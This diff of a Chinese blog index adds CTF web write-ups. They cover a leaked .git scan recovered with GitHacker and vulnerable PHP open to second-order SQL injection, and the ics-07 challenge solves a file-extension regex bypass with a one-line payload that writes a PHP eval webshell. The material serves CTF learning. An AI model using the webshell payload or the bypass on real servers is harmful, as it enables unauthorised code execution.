@@ -187,6 +187,439 @@
             
 
   
+    <article id="post-ctf/ctf笔记-06" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2020/10/25/ctf/ctf%E7%AC%94%E8%AE%B0-06/" target="_blank">CTF笔记-WEB攻防-06</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2020/10/25/ctf/ctf%E7%AC%94%E8%AE%B0-06/" class="archive-article-date">
+        <time datetime="2020-10-24T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-25</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>草！垃圾typola</p>
+<blockquote>
+<p>待补，这三道题不见了</p>
+</blockquote>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">ctf-web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">CTF笔记-WEB攻防</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2020/10/25/ctf/ctf%E7%AC%94%E8%AE%B0-06/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctf/ctf笔记-08" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2020/10/21/ctf/ctf%E7%AC%94%E8%AE%B0-08/" target="_blank">CTF笔记-WEB攻防-08</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2020/10/21/ctf/ctf%E7%AC%94%E8%AE%B0-08/" class="archive-article-date">
+        <time datetime="2020-10-21T07:40:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-21</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><blockquote>
+<ol>
+<li>git泄露</li>
+<li>git版本控制 git版本恢复</li>
+<li>sql二次注入(注释式构造)</li>
+<li>利用mysql函数load_file()读取文件( + 读取二进制文件使用hex()函数)</li>
+<li>/etc/passwd关于用户信息的泄露</li>
+<li>linux系统的历史指令文件(需有打开控制台的权限，与5.联合使用)</li>
+<li>.DS_Store泄露</li>
+</ol>
+</blockquote>
+<h2 id="入题"><a href="#入题" class="headerlink" title="入题"></a>入题</h2><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=4945410&auto=0&height=66"></iframe>
+
+<p>进入页面，只有”发帖”可以点，随便填点什么之后发现需要登录，跳转到了/login.php：</p>
+<p><a href="https://imgchr.com/i/BPnKTP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/21/BPnKTP.png" alt="BPnKTP.png"></a></p>
+<h3 id="burp爆破"><a href="#burp爆破" class="headerlink" title="burp爆破"></a>burp爆破</h3><p>发现placeholder有提示，上burpsuite使用数字爆破一下。</p>
+<p><del>嘛不过自己在爆破的时候随便猜了一下，发现是666然后过了</del></p>
+<p>之后再用dirsearch扫一下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[02:49:02] Starting:</span><br><span class="line">[02:49:03] 403 -  289B  - /.git/</span><br><span class="line">[02:49:03] 200 -   17B  - /.git/COMMIT_EDITMSG</span><br><span class="line">[02:49:03] 403 -  298B  - /.git/branches/</span><br><span class="line">[02:49:03] 200 -   92B  - /.git/config</span><br><span class="line">[02:49:03] 200 -  145B  - /.git/index</span><br><span class="line">[02:49:03] 200 -   73B  - /.git/description</span><br><span class="line">[02:49:03] 403 -  295B  - /.git/hooks/</span><br><span class="line">[02:49:03] 403 -  294B  - /.git/info/</span><br><span class="line">[02:49:03] 200 -  240B  - /.git/info/exclude</span><br><span class="line">[02:49:03] 403 -  294B  - /.git/logs/</span><br><span class="line">[02:49:03] 301 -  333B  - /.git/logs/refs  -&gt;  http://220.249.52.133:48820/.git/logs/refs/</span><br><span class="line">[02:49:03] 301 -  339B  - /.git/logs/refs/heads  -&gt;  http://220.249.52.133:48820/.git/logs/refs/heads/</span><br><span class="line">[02:49:03] 200 -  168B  - /.git/logs/refs/heads/master</span><br><span class="line">[02:49:03] 403 -  297B  - /.git/objects/</span><br><span class="line">[02:49:03] 403 -  294B  - /.git/refs/</span><br><span class="line">[02:49:03] 301 -  334B  - /.git/refs/heads  -&gt;  http://220.249.52.133:48820/.git/refs/heads/</span><br><span class="line">[02:49:03] 200 -   41B  - /.git/refs/heads/master</span><br><span class="line">[02:49:03] 301 -  333B  - /.git/refs/tags  -&gt;  http://220.249.52.133:48820/.git/refs/tags/</span><br><span class="line">[02:49:03] 403 -  298B  - /.htaccess.bak1</span><br><span class="line">[02:49:03] 403 -  298B  - /.htaccess.orig</span><br><span class="line">[02:49:03] 403 -  300B  - /.htaccess.sample</span><br><span class="line">[02:49:03] 403 -  298B  - /.htaccess.save</span><br><span class="line">[02:49:03] 403 -  296B  - /.htaccessBAK</span><br><span class="line">[02:49:03] 403 -  296B  - /.htaccessOLD</span><br><span class="line">[02:49:03] 403 -  297B  - /.htaccessOLD2</span><br><span class="line">[02:49:03] 403 -  295B  - /.httr-oauth</span><br><span class="line">[02:49:04] 403 -  288B  - /.php</span><br><span class="line">[02:49:11] 301 -  322B  - /css  -&gt;  http://220.249.52.133:48820/css/</span><br><span class="line">[02:49:12] 301 -  324B  - /fonts  -&gt;  http://220.249.52.133:48820/fonts/</span><br><span class="line">[02:49:12] 200 -    7KB - /index.php</span><br><span class="line">[02:49:12] 200 -    7KB - /index.php/login/</span><br><span class="line">[02:49:13] 301 -  321B  - /js  -&gt;  http://220.249.52.133:48820/js/</span><br><span class="line">[02:49:13] 200 -    2KB - /login.php</span><br><span class="line">[02:49:14] 200 -    0B  - /mysql.php</span><br><span class="line">[02:49:16] 403 -  297B  - /server-status</span><br><span class="line">[02:49:16] 403 -  298B  - /server-status/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+
+<h3 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h3><p>好家伙，git泄露了，使用<a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">githacker</a>下载下来.git文件</p>
+<p>发现do_write.php几乎什么也没有，扑了个空？</p>
+<h3 id="git-恢复历史版本"><a href="#git-恢复历史版本" class="headerlink" title="git 恢复历史版本"></a>git 恢复历史版本</h3><blockquote>
+<p>以后在面对git泄露的漏洞时，一定要使用git log –reglog查看下历史文件，挨个恢复一遍看看</p>
+</blockquote>
+<p><a href="https://imgchr.com/i/BPGo1x" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/21/BPGo1x.md.png" alt="BPGo1x.md.png"></a></p>
+<p>需要注意到的坑：</p>
+<blockquote>
+<ol>
+<li><p>GitHacker的运行环境为linux</p>
+</li>
+<li><p>当单次执行时，需要输入以下代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git add -A</span><br><span class="line">git commit -m <span class="string">"qwq"</span></span><br><span class="line">python GitHacker.py [url]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在获取成功后，使用以下指令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> [that ip]</span><br><span class="line"><span class="comment"># 需要进入下载好的文件夹再使用git，否则没有效果</span></span><br><span class="line">git <span class="built_in">log</span> --reglog</span><br><span class="line"><span class="comment"># 查看版本号</span></span><br><span class="line">git reset --hard [version]</span><br><span class="line"><span class="comment"># 恢复历史记录</span></span><br><span class="line"><span class="comment"># git reset --hard 2393e10f134536b2141d97819d73a68dec417106</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</blockquote>
+<p>我们终于拿到了关于SQL注入的源码了，接下来让我们开始代码审计   吧。</p>
+<h3 id="SQL-二次注入"><a href="#SQL-二次注入" class="headerlink" title="SQL-二次注入"></a>SQL-二次注入</h3><p>这是截下来的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"mysql.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>] != <span class="string">'yes'</span>)&#123;</span><br><span class="line">    header(<span class="string">"Location: ./login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">'do'</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'write'</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">'category'</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">'title'</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into board</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                title = '$title',</span></span><br><span class="line"><span class="string">                content = '$content'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'comment'</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">'bo_id'</span>]);</span><br><span class="line">    $sql = <span class="string">"select category from board where id='$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">'category'</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    $sql = <span class="string">"insert into comment</span></span><br><span class="line"><span class="string">            set category = '$category',</span></span><br><span class="line"><span class="string">                content = '$content',</span></span><br><span class="line"><span class="string">                bo_id = '$bo_id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Location: ./comment.php?id=$bo_id"</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: ./index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>(待写完)</p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">ctf-web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">CTF笔记-WEB攻防</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2020/10/21/ctf/ctf%E7%AC%94%E8%AE%B0-08/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctf/ctf笔记-07" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2020/10/20/ctf/ctf%E7%AC%94%E8%AE%B0-07/" target="_blank">CTF笔记-WEB攻防-07</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2020/10/20/ctf/ctf%E7%AC%94%E8%AE%B0-07/" class="archive-article-date">
+        <time datetime="2020-10-20T09:30:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-20</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a>ics-07</h2><p>我们的工控云管理叕叒出问题啦，点开”项目管理”，进入之后看到最下面有一行”view source”，进入页面，开始审计php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[page])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[page]) &amp;&amp; $_GET[page] != <span class="string">'index.php'</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">'Location: ?page=flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'admin'</span>]) &#123;</span><br><span class="line">    $con = $_POST[<span class="string">'con'</span>];</span><br><span class="line">    $file = $_POST[<span class="string">'file'</span>];</span><br><span class="line">    $filename = <span class="string">"backup/"</span>.$file;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/.+\.ph(p[3457]?|t|tml)$/i'</span>, $filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bad file extension"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        chdir(<span class="string">'uploaded'</span>);</span><br><span class="line">        $f = fopen($filename, <span class="string">'w'</span>);</span><br><span class="line">        fwrite($f, $con);</span><br><span class="line">        fclose($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[id]) &amp;&amp; floatval($_GET[id]) !== <span class="string">'1'</span> &amp;&amp; substr($_GET[id], <span class="number">-1</span>) === <span class="string">'9'</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line">    $id = mysql_real_escape_string($_GET[id]);</span><br><span class="line">    $sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $result = mysql_fetch_object($result);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $result = <span class="keyword">False</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$result)<span class="keyword">die</span>(<span class="string">"&lt;br &gt;something wae wrong ! &lt;br&gt;"</span>);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"id: "</span>.$result-&gt;id.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"name:"</span>.$result-&gt;user.<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    $_SESSION[<span class="string">'admin'</span>] = <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一段是关于页面跳转的，第二段需要获取admin之后再看，先看第三段，是关于id的，这里检测为：</p>
+<blockquote>
+<p>浮点数不为1,且最后一位为9，则执行mysql_real_escape_string()函数，代入sql语句中</p>
+</blockquote>
+<h3 id="关于mysql-real-escape-string函数"><a href="#关于mysql-real-escape-string函数" class="headerlink" title="关于mysql_real_escape_string函数"></a>关于mysql_real_escape_string函数</h3><p>这是在PHP7.0即已废除的函数，模拟实际情况则以mysqli_real_escape_string(版本&gt;7.0)，我们发现<code>‘</code>被转义了(加了一个反斜杠<code>\</code>)</p>
+<p>我们试着输入1’9，结果发现返回了id和name，并且成功赋值了admin</p>
+<p>自己测试说明是可行的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysqli_connect(<span class="string">"sth"</span>, <span class="string">"sth"</span>, <span class="string">"sth"</span>);</span><br><span class="line">$id = <span class="string">"1'9"</span>;</span><br><span class="line">$id = mysqli_real_escape_string($con, $id);</span><br><span class="line">$sql=<span class="string">"select * from cetc007.user where id='$id'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;<span class="comment">//select * from cetc007.user where id='1\'9'</span></span><br></pre></td></tr></table></figure>
+
+<p>用这样的格式试着查查自己的数据库：</p>
+<p><a href="https://imgchr.com/i/Bp3gYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/Bp3gYV.md.png" alt="Bp3gYV.md.png"></a></p>
+<h3 id="绕过-ph-p-3457-t-tml-i正则"><a href="#绕过-ph-p-3457-t-tml-i正则" class="headerlink" title="绕过/.+\.ph(p[3457]?|t|tml)$/i正则"></a>绕过<code>/.+\.ph(p[3457]?|t|tml)$/i</code>正则</h3><blockquote>
+<p>精妙的构造：<code>example.php3/4.php/../</code></p>
+</blockquote>
+<p>由此，我们便能随心所欲地写入文件了(记得文件目录是在uploaded下的backup)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">con=&lt;?php+eval($_POST[&quot;hacked&quot;]);?&gt;&amp;file=awa.php/3.php/..</span><br></pre></td></tr></table></figure>
+
+<p>之后使用菜刀连接，得到flag即可。</p>
+<hr>
+<blockquote>
+<p>后话：以后就一篇一道题咯，题的难度越来越大了，写WP所需要的篇幅量也在增大。至于为什么把这道题单独放出来……因为后面我没再遇到能用这么短WP讲出来的题。</p>
+</blockquote>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">ctf-web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">CTF笔记-WEB攻防</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2020/10/20/ctf/ctf%E7%AC%94%E8%AE%B0-07/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ctf/ctf笔记-05" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2020/10/14/ctf/ctf%E7%AC%94%E8%AE%B0-05/" target="_blank">CTF笔记-WEB攻防-05</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2020/10/14/ctf/ctf%E7%AC%94%E8%AE%B0-05/" class="archive-article-date">
+        <time datetime="2020-10-13T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-14</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>草！垃圾typola</p>
+<blockquote>
+<p>待补，这三道题不见了</p>
+</blockquote>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">ctf-web</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">CTF笔记-WEB攻防</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2020/10/14/ctf/ctf%E7%AC%94%E8%AE%B0-05/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" target="_blank" rel="noopener" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-ctf/ctf笔记-04" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -799,391 +1232,6 @@
 
 
   
-    <article id="post-nodeJs/10. WebSocket" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2020/09/29/nodeJs/10.%20WebSocket/" target="_blank">10.WebSocket</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2020/09/29/nodeJs/10.%20WebSocket/" class="archive-article-date">
-        <time datetime="2020-09-29T11:15:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-29</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
-  <div class="article-entry" itemprop="articleBody">
-    
-    <h1 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h1><p><code>注解：书中使用的WebSocket.io已经是8年未动的过时项目了，因此这里的所有内容使用的均为ws</code></p>
-<blockquote>
-<p>使用ws模块</p>
-</blockquote>
-<p><strong>客户端</strong></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//WebSocket实例化</span></span><br><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"ws://localhost:8181"</span>);</span><br><span class="line">ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//成功连接服务器回调</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'客户端（client）：与服务器的连接已打开'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendMessage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    ws.send($(<span class="string">'#message'</span>).val());</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-
-
-<p><strong>服务端</strong></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> WebSocketServer = <span class="built_in">require</span>(<span class="string">'ws'</span>).Server;</span><br><span class="line"><span class="keyword">var</span> wss = <span class="keyword">new</span> WebSocketServer(&#123;<span class="attr">port</span>: <span class="number">8181</span>&#125;);</span><br><span class="line">wss.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">ws</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'服务器端：客户端已连接'</span>);</span><br><span class="line">    ws.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">        <span 